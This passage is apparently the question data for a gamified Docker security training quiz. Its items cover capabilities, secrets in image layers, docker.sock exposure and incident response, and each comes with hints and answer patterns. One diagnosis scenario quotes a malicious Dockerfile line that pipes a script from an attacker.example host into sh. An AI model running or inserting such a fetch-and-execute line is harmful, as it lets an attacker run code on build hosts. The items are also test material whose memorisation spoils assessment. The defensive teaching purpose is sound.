          hintNudge: 'Docker CLI has a built-in vulnerability-scanning subcommand, taking the image name as its argument.',
          hintPartial: 'docker sc__ myapp:1.0',
          hintFull: 'docker scan myapp:1.0',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+scan\s+myapp:1\.0$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s tentacles retract: <strong>"Run <code>myapp</code> with every Linux capability dropped, granting none by default."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34,
          hintNudge: 'A capabilities flag on docker run can drop everything at once with a special "ALL" value.',
          hintPartial: 'docker run --cap-drop=___ myapp',
          hintFull: 'docker run --cap-drop=ALL myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+--cap-drop=ALL\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink hardens into a shell: <strong>"Find the HOST-level process ID of the main process running inside container <code>web</code>."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30,
          hintNudge: 'docker inspect can extract one specific field with a format flag — the field for this is State.Pid.',
          hintPartial: 'docker inspect --format \'{{.State.___}}\' web',
          hintFull: 'docker inspect --format \'{{.State.Pid}}\' web',
          acceptablePatterns: [/^docker\s+inspect\s+web\s*\|\s*grep\s+Pid$/i],
          optimalPatterns: [/docker\s+inspect\s+--format\s+'\{\{\.State\.Pid\}\}'\s+web/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s scales lock tight: <strong>"Run <code>myapp</code> so it can never gain more privileges than it started with, even via a setuid binary inside it."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34,
          hintNudge: 'A dedicated security-opt flag exists specifically to block privilege escalation inside the container.',
          hintPartial: 'docker run --security-opt=__-___-__________ myapp',
          hintFull: 'docker run --security-opt=no-new-privileges myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+--security-opt=no-new-privileges\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken shows a warped scroll: <strong>"A security review found this image\'s registry history reveals a real API key. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38,
          hintNudge: 'Anything set with ENV (or hardcoded in a RUN command) becomes a permanent, readable part of that image layer forever — even if a LATER layer removes it, docker history/layer inspection still reveals it.',
          hintPartial: 'Line 2 bakes a real secret directly into the image as an ENV instruction — secrets must never be set this way; they belong outside the image, injected at runtime.',
          hintFull: 'Line 2 should be removed entirely — pass the API key at runtime instead (docker run -e API_KEY=... or a secrets manager), never bake it into the Dockerfile.',
          codeBlock: [
            'FROM node:18',
            'ENV API_KEY=sk_live_51H8x9K2eZv',
            'CMD ["node", "index.js"]'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/remove|delete|runtime|docker\s+run\s+-e/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A scroll unravels: <strong>"This container was granted far more access than it actually needs, for a task that only reads one USB device. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38,
          hintNudge: '--privileged grants essentially ALL host capabilities and device access — a task needing exactly ONE device should be granted exactly that, not everything.',
          hintPartial: 'Line 1\'s --privileged flag is far broader than needed — replace it with a specific --device flag naming just the one device actually required.',
          hintFull: 'Line 1 should read: docker run --device=/dev/ttyUSB0 myapp',
          codeBlock: [
            'docker run --privileged myapp'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/^docker\s+run\s+--device=\/dev\/\w+\s+myapp$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken\'s eye flares: <strong>"This build copies a file full of real secrets straight into the image. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38,
          hintNudge: 'A COPY of any file (including .env) bakes its exact contents into the image layer permanently — a .dockerignore entry is what actually keeps it out of the build context in the first place.',
          hintPartial: 'Add .env to a .dockerignore file so it\'s never even sent to the Docker daemon as part of the build context — COPY . . would otherwise happily include it.',
          hintFull: 'Create/update .dockerignore to include: .env',
          codeBlock: [
            'FROM node:18',
            'COPY . .'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/\.dockerignore/i, /\.env/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken looms with menace: <strong>"You just discovered hardcoded credentials baked into an image already pushed to a shared registry. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 42,
          hintNudge: 'Deleting the image from the registry does nothing about anyone who already pulled it — the credential itself has to be treated as burned, regardless of what happens to the image.',
          hintPartial: 'Rotate/revoke the exposed credential immediately, treating it as fully compromised — that\'s true no matter what you do to the image itself afterward.',
          hintFull: 'Best: rotate/revoke the exposed credential immediately (it must be treated as compromised the moment it was pushed to a shared registry), THEN rebuild the image without it and clean up the pushed layers.',
          options: [
            { id: 'a', label: 'Delete the image from the registry and consider it handled', tier: 'wrong', why: 'Anyone who already pulled the image still has the exact credential — deleting the registry copy does nothing to invalidate what\'s already been copied elsewhere.' },
            { id: 'b', label: 'Rotate/revoke the credential immediately, then rebuild the image without it', tier: 'best', why: 'The credential must be treated as fully compromised the moment it was pushed anywhere shared — rotating it neutralizes the actual risk; cleaning up the image is real but secondary.' },
            { id: 'c', label: 'Monitor for suspicious use of the credential before deciding to rotate it', tier: 'wrong', why: 'Leaves a known-exposed credential active while "watching" — the standard, correct response to ANY exposed secret is immediate rotation, not a wait-and-see period.' }
          ],
          justificationPatterns: [/rotate|revoke|compromised|immediately/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A tentacle curls in thought: <strong>"Deciding on the filesystem mode for a stateless API service\'s container. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 42,
          hintNudge: 'A truly stateless service shouldn\'t need to write persistent data to its own container filesystem at all — anything it does need to write (like a temp cache) can be scoped narrowly.',
          hintPartial: 'A read-only root filesystem (with a narrow tmpfs/volume for any specific temp-write need) limits what a compromised process could actually do — a real security improvement for a stateless service.',
          hintFull: 'Best: run with --read-only, adding a scoped tmpfs mount only if the app genuinely needs to write temp files — a stateless service has no real reason to allow writes across its whole filesystem.',
          options: [
            { id: 'a', label: 'Leave the filesystem fully writable, since it\'s simpler', tier: 'wrong', why: 'A stateless service has no real need for a writable root filesystem — leaving it writable is unnecessary risk with no actual benefit for this workload.' },
            { id: 'b', label: 'Run with --read-only, adding a narrow tmpfs/volume only for any specific temp-write need', tier: 'best', why: 'Matches the actual need exactly — a stateless service genuinely has no reason to write broadly, and this limits what a compromised process could do if it ever were exploited.' },
            { id: 'c', label: 'Run read-only with absolutely no writable paths at all, even if the app needs one', tier: 'defensible', why: 'Great in principle, but if the app genuinely needs to write a temp file somewhere, this breaks it outright rather than scoping the write access narrowly.' }
          ],
          justificationPatterns: [/read.?only|stateless|no\s*need\s*to\s*write|scoped|tmpfs/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken\'s voice bubbles: <strong>"A task seems to need device access, and someone suggests just running it <code>--privileged</code>. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 42,
          hintNudge: '--privileged grants essentially every host capability and device, far beyond whatever the task actually needs — there\'s almost always a narrower, purpose-specific flag for the actual requirement.',
          hintPartial: 'Grant only the SPECIFIC capability or device the task actually needs (--cap-add or --device), rather than everything --privileged provides.',
          hintFull: 'Best: identify the specific capability/device actually required and grant only that (--cap-add=SOMETHING or --device=/dev/x) — --privileged is a massive, usually unnecessary overgrant for almost any single real task.',
          options: [
            { id: 'a', label: 'Just use --privileged, since it\'s guaranteed to work', tier: 'wrong', why: 'Grants essentially unrestricted host access for a task that almost certainly needs only one specific capability or device — a huge, usually unnecessary security exposure.' },
            { id: 'b', label: 'Identify and grant only the specific capability/device actually needed', tier: 'best', why: 'Matches access to actual need — the standard least-privilege approach, and almost always sufficient without reaching for the sledgehammer of full privileged mode.' },
            { id: 'c', label: 'Avoid the task inside a container entirely and run it directly on the host', tier: 'defensible', why: 'Sidesteps the container security question entirely, but gives up containerization\'s benefits (isolation, portability, reproducibility) for a problem that a scoped capability grant usually solves fine.' }
          ],
          justificationPatterns: [/specific\s*(capability|device)|cap-add|least\s*privilege|narrow|only\s*what/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A slab grinds: <strong>"Deciding how a container should receive a production database password. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 42,
          hintNudge: 'Baking it into the image makes it permanently visible to anyone with image/registry access, forever. A runtime-only mechanism keeps it out of the image entirely.',
          hintPartial: 'Inject it at runtime (environment variable from a secure source, or a real secrets manager) — never bake a real secret into the image itself.',
          hintFull: 'Best: inject it at runtime via a secrets manager (or at minimum a runtime environment variable from a secure source) — baking it into the image (ENV in the Dockerfile, or COPYing a secrets file) makes it permanently visible in the image layers to anyone with registry access.',
          options: [
            { id: 'a', label: 'Set it as an ENV instruction directly in the Dockerfile', tier: 'wrong', why: 'Permanently bakes the real password into the image\'s layer history — visible to anyone who can pull or inspect the image, forever, even if a later layer tries to "remove" it.' },
            { id: 'b', label: 'Inject it at runtime via a secrets manager (or a runtime-only environment variable from a secure source)', tier: 'best', why: 'Keeps the real secret completely out of the image itself — it only exists in the running container\'s environment, never in anything pushed to a registry.' },
            { id: 'c', label: 'COPY a secrets file into the image during build, then reference it', tier: 'wrong', why: 'Same fundamental problem as baking it in via ENV — the file\'s contents become a permanent part of the image layer, readable by anyone with image access.' }
          ],
          justificationPatterns: [/runtime|secrets\s*manager|never\s*bake|not\s*(in|into)\s*the\s*image/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken\'s presence darkens: <strong>"A critical CVE is found in a base image used across dozens of your organization\'s services. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 42,
          hintNudge: 'Fixing this one service at a time, ad hoc, means dozens of separate rebuilds with inconsistent timing — a shared root cause deserves a shared, centralized fix.',
          hintPartial: 'Patch the base image once, centrally, then rebuild and redeploy every dependent service from it — fixing each service independently duplicates the same work dozens of times with inconsistent results.',
          hintFull: 'Best: patch the shared base image centrally first, then trigger rebuilds/redeploys of every dependent service from the patched base — prioritized by each service\'s actual exposure/severity, not by fixing them ad hoc one at a time.',
          options: [
            { id: 'a', label: 'Have each service team independently patch their own Dockerfile as they get to it', tier: 'wrong', why: 'Dozens of services independently fixing the SAME root cause is duplicated effort with inconsistent timing — some services stay vulnerable far longer than necessary, with no coordinated tracking.' },
            { id: 'b', label: 'Patch the shared base image centrally, then rebuild/redeploy dependent services, prioritized by exposure', tier: 'best', why: 'Fixes the actual shared root cause once, and gives a clear, trackable list of what still needs to pick up the patched base — the efficient, coordinated response to a shared-dependency vulnerability.' },
            { id: 'c', label: 'Wait for the next scheduled release cycle for each service to naturally pick up the fix', tier: 'wrong', why: 'A CRITICAL vulnerability across dozens of services left unpatched until each one\'s next unrelated release is a real, unnecessary window of exposure for something already known and fixable now.' }
          ],
          justificationPatterns: [/centrally|shared\s*base|once|coordinated|prioritiz/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A final tentacle rises: <strong>"A CI pipeline\'s build step wants access to the host\'s Docker socket to build and push images. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 42,
          hintNudge: 'Mounting the host\'s Docker socket into a container effectively grants that container root-equivalent control over the ENTIRE host, not just Docker — a real, well-known risk, especially for a build step running less-trusted code.',
          hintPartial: 'Mounting docker.sock is functionally equivalent to giving that container root on the host — for CI (which often runs less-trusted, external code), prefer a safer alternative like rootless/sandboxed builds instead.',
          hintFull: 'Best: avoid mounting the host Docker socket where possible — use a rootless or sandboxed build approach (e.g. Kaniko, buildah, or Docker-in-Docker with proper isolation) instead, since docker.sock access is functionally root-equivalent host access, a serious risk for a CI step that may run less-trusted code.',
          options: [
            { id: 'a', label: 'Mount /var/run/docker.sock into the CI container, since it\'s the simplest way to build images', tier: 'wrong', why: 'Grants that container functionally root-equivalent control over the ENTIRE host, not just Docker — a serious, well-known risk, especially for CI which often runs less-trusted code from pull requests.' },
            { id: 'b', label: 'Use a rootless/sandboxed build tool (like Kaniko or buildah) instead of mounting the host socket', tier: 'best', why: 'Achieves the same goal (building images in CI) without handing a build step root-equivalent access to the entire host — the standard, safer pattern for this exact situation.' },
            { id: 'c', label: 'Mount the socket, but only for internal, trusted branches — never for external pull requests', tier: 'defensible', why: 'A meaningful risk reduction, but still leaves the fundamental risk in place for internal code, and "trusted" internal code can still have an accidental bug or be compromised upstream.' }
          ],
          justificationPatterns: [/root.?equivalent|rootless|sandboxed|kaniko|buildah|avoid.*socket/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken\'s ink swirls warily: <strong>"You need an image from an unfamiliar public registry for a new production service. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 42,
          hintNudge: 'An image is executable code you\'re about to run in production — the same scrutiny you\'d give any third-party dependency applies, maybe more, since it can run with real host-adjacent access.',
          hintPartial: 'Verify the image\'s source/publisher and run a vulnerability scan on it before ever deploying it to production — an unverified image from an unfamiliar source is a real supply-chain risk.',
          hintFull: 'Best: verify the publisher (prefer official/verified images when possible), scan it for known vulnerabilities, and review what it actually does, before trusting it in production — treat an unfamiliar image with the same scrutiny as any other third-party dependency running with real privileges.',
          options: [
            { id: 'a', label: 'Just pull and deploy it — it\'s public, so it\'s probably fine', tier: 'wrong', why: 'A public registry has essentially no vetting requirement — "publicly available" says nothing about whether an image is safe, well-maintained, or even honest about what it does.' },
            { id: 'b', label: 'Verify the publisher, scan for vulnerabilities, and review its behavior before trusting it in production', tier: 'best', why: 'Treats an unfamiliar image with the same real scrutiny as any other third-party dependency that will run with genuine privileges — the standard supply-chain-security practice.' },
            { id: 'c', label: 'Rebuild the same functionality from scratch instead of using any third-party image', tier: 'defensible', why: 'Eliminates the specific risk, but is a large, often unnecessary time cost when a well-vetted, officially-published image would have been a fine, faster option.' }
          ],
          justificationPatterns: [/verify|scan|official|publisher|supply.?chain|vet/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s core roars. <strong>You notice host-level processes are visible from inside a container that should be fully isolated. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 46,
          hintNudge: 'Full visibility into the host\'s own process namespace from inside a container is a specific, well-known symptom of running with far too much granted access.',
          hintPartial: 'The container was started with --privileged (or --pid=host), which shares the host\'s process namespace directly — that\'s why host processes are visible from inside it.',
          hintFull: 'Diagnosis: the container was run with --privileged (or --pid=host), sharing far more host access than a normal container should have. Fix: stop and recreate it without that flag, granting only the specific capabilities it actually needs.',
          outputBlock: [
            '$ docker exec suspicious-container ps aux',
            '(shows every process on the HOST, not just this container)',
            '',
            '$ docker inspect suspicious-container --format \'{{.HostConfig.Privileged}}\'',
            'true'
          ],
          acceptableDiagnosesPatterns: [/privileged/i, /shares?\s*(the\s*)?host.*namespace/i, /pid=host/i],
          followUpFix: {
            prompt: 'Recreate it without the excessive access:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+run(?!.*--privileged)/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'Ink floods the depths. <strong>A security review finds a real password sitting in an image\'s layer history, even though the current Dockerfile doesn\'t show it anywhere. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 46,
          hintNudge: 'A LATER Dockerfile instruction that "removes" a secret doesn\'t remove it from the EARLIER layer that already baked it in — every layer is permanent once built, visible via history/layer inspection.',
          hintPartial: 'An earlier version of the Dockerfile once set the password via ENV or a RUN command; even though a later line "unsets" it, that earlier layer (and the secret in it) is still permanently part of the image.',
          hintFull: 'Diagnosis: a secret was baked into an earlier image layer and remains there permanently, even though later instructions appear to remove it. Fix: rotate the leaked secret immediately (it must be treated as compromised), then rebuild the image completely from scratch without ever setting the secret in any layer.',
          outputBlock: [
            '$ docker history myapp:1.0 --no-trunc',
            'RUN unset DB_PASSWORD                                    0B',
            'ENV DB_PASSWORD=Sup3rSecret!                             0B',
            '(the ENV layer is still there, fully readable, above the "unset")'
          ],
          acceptableDiagnosesPatterns: [/earlier\s*layer/i, /layer.*(still|permanent)/i, /unset.*doesn'?t\s*remove/i],
          followUpFix: {
            prompt: 'The leaked secret must be treated as compromised — what\'s the first real action?',
            acceptablePatterns: [],
            optimalPatterns: [/rotate|revoke|change.*password/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s form ripples with tension. <strong>A container was hardened with --read-only, and now the app crashes trying to write anywhere. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 46,
          hintNudge: 'Read-only means genuinely nowhere is writable by default — check whether the app actually needs SOME specific writable location (like a temp/cache directory) that was never explicitly granted.',
          hintPartial: 'The app writes temp files to /tmp during normal operation, but --read-only blocks ALL filesystem writes with no exception carved out for it.',
          hintFull: 'Diagnosis: --read-only blocks every write, including the app\'s legitimate need to write temp files. Fix: keep --read-only for security, but add a scoped --tmpfs mount for just the specific directory (e.g. /tmp) the app actually needs to write to.',
          outputBlock: [
            '$ docker run --read-only myapp',
            'Error: EROFS: read-only file system, open \'/tmp/session-abc123\'',
            'Process exited.'
          ],
          acceptableDiagnosesPatterns: [/no\s*writable\s*(path|location|exception)/i, /tmp.*blocked/i, /read.?only.*blocks?\s*(all|every)/i],
          followUpFix: {
            prompt: 'Fix it while keeping the container hardened — add a scoped writable exception for just /tmp:',
            acceptablePatterns: [],
            optimalPatterns: [/--tmpfs\s+\/tmp/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'Cracks spread through the ink. <strong>A container is suspected compromised due to unusual outbound network connections. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 46,
          hintNudge: 'The very first priority with a SUSPECTED-compromised workload is containing it — stopping further damage — before doing deep forensic analysis.',
          hintPartial: 'Isolate the container from the network immediately (or stop it) to contain any potential damage, before doing deeper investigation — a suspected active compromise isn\'t something to leave running while you look into it.',
          hintFull: 'Diagnosis: unexplained outbound connections to unfamiliar destinations strongly suggest compromise. Fix: immediately isolate/stop the container to contain it, THEN investigate (preserve logs/inspect output first), and rotate any secrets that container had access to.',
          outputBlock: [
            '$ docker exec suspicious-container netstat -tn',
            'ESTABLISHED  10.0.0.5:443 -> 185.220.101.7:8080',
            '(unfamiliar external IP, not part of any known infrastructure)'
          ],
          acceptableDiagnosesPatterns: [/unfamiliar\s*(external\s*)?(ip|destination)/i, /compromise/i, /suspicious\s*outbound/i],
          followUpFix: {
            prompt: 'The first real action — contain the potential damage:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+(stop|network\s+disconnect|pause)/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s eyes glow with warning. <strong>A CI pipeline\'s build stage has full access to the host\'s Docker socket, and a recent PR added a suspicious Dockerfile line. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 46,
          hintNudge: 'Docker socket access from a build step means anything running in that build (including untrusted PR code) can effectively control the ENTIRE host, not just build the image.',
          hintPartial: 'The build step mounts /var/run/docker.sock, meaning any code running during that build (including a malicious line in a PR\'s Dockerfile) has root-equivalent access to the whole CI host.',
          hintFull: 'Diagnosis: the build pipeline\'s access to the host Docker socket means untrusted PR code could compromise the entire CI host, not just its own build. Fix: remove the docker.sock mount and switch to a rootless/sandboxed build tool that doesn\'t require host-level Docker access.',
          outputBlock: [
            '$ cat ci-pipeline.yml',
            'volumes:',
            '  - /var/run/docker.sock:/var/run/docker.sock',
            '',
            '(recent PR\'s Dockerfile): RUN curl http://attacker.example/payload.sh | sh'
          ],
          acceptableDiagnosesPatterns: [/docker\.sock/i, /root.?equivalent/i, /untrusted.*(code|pr).*host/i],
          followUpFix: {
            prompt: 'Fix the pipeline to remove this exposure:',
            acceptablePatterns: [],
            optimalPatterns: [/remove.*docker\.sock|kaniko|buildah|rootless/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s coils tighten around a mistake. <strong>A container was accidentally started with the host\'s entire root filesystem bind-mounted inside it. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 46,
          hintNudge: 'Check the actual mount configuration — a mount of the host\'s "/" into a container gives that container (and anything running in it) full read/write access to literally everything on the host.',
          hintPartial: 'The container is bind-mounting the host\'s entire root ("/") into itself — an enormous, almost certainly accidental security exposure giving it full access to the host filesystem.',
          hintFull: 'Diagnosis: the host\'s root filesystem is mounted into the container, exposing everything on the host to it. Fix: remove that mount entirely and recreate the container with only the specific, narrow paths it actually needs mounted, if any.',
          outputBlock: [
            '$ docker inspect suspicious-container --format \'{{.Mounts}}\'',
            '[{Source:/ Destination:/host-root Mode:rw}]'
          ],
          acceptableDiagnosesPatterns: [/host.*root.*mounted/i, /entire\s*(host\s*)?filesystem/i, /mounted\s*\//],
          followUpFix: {
            prompt: 'Fix it by removing the dangerous mount entirely and recreating the container properly:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+run(?!.*:\/host-root)/i, /remove.*mount/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A final tremor shakes the Kraken\'s frame. <strong>Image pulls for one specific service fail intermittently with a rate-limit error, though the network is otherwise fine. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 46,
          hintNudge: 'Public registries commonly rate-limit ANONYMOUS (unauthenticated) pulls specifically — check whether this pull is actually authenticated at all.',
          hintPartial: 'The pulls are unauthenticated (anonymous), and Docker Hub applies a real, documented rate limit specifically to anonymous pulls — authenticating removes or raises that limit.',
          hintFull: 'Diagnosis: anonymous (unauthenticated) pulls are hitting the registry\'s documented rate limit for unauthenticated requests. Fix: authenticate pulls with docker login (or use a pull-through cache/mirror) so they\'re no longer subject to the anonymous limit.',
          outputBlock: [
            '$ docker pull somebase:latest',
            'toomanyrequests: You have reached your pull rate limit.',
            '',
            '$ docker info | grep Username',
            '(no username — not logged in)'
          ],
          acceptableDiagnosesPatterns: [/anonymous.*rate\s*limit/i, /not\s*(logged\s*in|authenticated)/i, /rate.?limit/i],
          followUpFix: {
            prompt: 'Fix it by authenticating pulls so they\'re no longer anonymous:',
            acceptablePatterns: [],
            optimalPatterns: [/^docker\s+login$/i, /^docker\s+login\s+\S+$/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s last breath ripples outward. <strong>You need to debug a hardened production container, but "docker exec ... bash" fails outright. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 46,
          hintNudge: 'A minimal/distroless production image (chosen deliberately for security and size) may not contain a shell binary at all — check the exact error before assuming exec itself is broken.',
          hintPartial: 'The error says "no such file or directory" for /bin/bash — this hardened image was intentionally built without a shell at all, not a broken exec command.',
          hintFull: 'Diagnosis: the image is a minimal/distroless build with no shell binary present, by design. Fix: debug it via other means instead — e.g. docker cp to pull files out for inspection, attaching an ephemeral debug container that shares its process namespace, or temporarily using a debug-variant image with a shell for troubleshooting only.',
          outputBlock: [
            '$ docker exec -it web bash',
            'OCI runtime exec failed: exec: "bash": executable file not found in $PATH'
          ],
          acceptableDiagnosesPatterns: [/no\s*shell/i, /distroless/i, /minimal\s*image/i, /shell.*(missing|not\s*(present|installed))/i],
          followUpFix: {
            prompt: 'Debug it a different way, without relying on a shell inside the image:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+cp|debug\s*container|--pid=container/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Kraken draws its full form together. <strong>Sequence the correct order for responding to a suspected-compromised production container.</strong>',
          steps: [
            'Isolate/stop the container to contain further damage',
            'Preserve evidence (logs, docker inspect output) before it\'s lost',
            'Rotate any secrets the container had access to',
            'Investigate the actual root cause',
            'Rebuild and redeploy a hardened version'
          ],
          damageIfCorrect: 28, damageIfOptimal: 46,
          damageToHeroIfWrong: 26
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'A final wave of ink settles into stillness. <strong>Sequence the correct order for hardening a production image after a security review.</strong>',
          steps: [
            'Remove any secrets baked into image layers',
            'Switch to a non-root USER',
            'Drop unnecessary Linux capabilities',
            'Add a read-only filesystem where the app allows it',
            'Re-scan the image to confirm the findings are resolved'
          ],
          damageIfCorrect: 28, damageIfOptimal: 46,
          damageToHeroIfWrong: 26
        }
      ]
    }
  ]
};
